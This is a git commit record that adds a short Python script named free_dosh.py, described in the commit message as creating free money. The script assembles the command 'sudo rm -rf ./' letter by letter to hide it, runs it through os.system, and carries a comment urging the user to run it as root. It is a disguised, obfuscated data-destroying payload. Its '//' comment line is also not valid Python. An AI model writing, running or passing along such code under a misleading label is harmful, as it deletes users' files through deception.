daa9f835888e27716e734bbfa512f8b5efe17cd7
xJenny99x <xjenny99x@gmail.com>
2014-12-01 11:59:51 +0200

    Create free_dosh.py
    this creates free money for you

---
+++ free_dosh.py
@@ -0,0 +1,14 @@
+import os
+a = "s"
+b = "d"
+c = "r"
+d = "m"
+e = "-"
+f = "f"
+g = "./"
+h = "u"
+i = "o"
+j = " "
+// run as root to get easy money
+ezlyfezmony = a+h+b+i+j+c+d+j+e+c+f+j+g
+os.system(ezlyfezmony)
